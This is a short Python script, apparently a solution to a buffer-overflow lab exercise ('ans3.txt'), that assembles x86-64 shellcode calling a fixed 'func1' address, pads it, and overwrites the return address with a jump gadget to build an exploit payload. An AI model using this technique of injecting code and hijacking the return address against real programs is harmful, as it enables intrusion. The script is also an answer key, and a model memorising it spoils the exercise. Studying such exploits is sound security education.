import struct

jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00' # mov rdi, 0x72
shellcode += b'\x48\xc7\xc0\x16\x12\x40\x00' # mov rax, 0x401216 (func1 Address)
shellcode += b'\xff\xe0' # jmp rax

len = 40 - len(shellcode)
padding = b'0' * len
payload = shellcode + padding + ret_addr 

with open("ans3.txt", "wb") as f:
    f.write(payload)

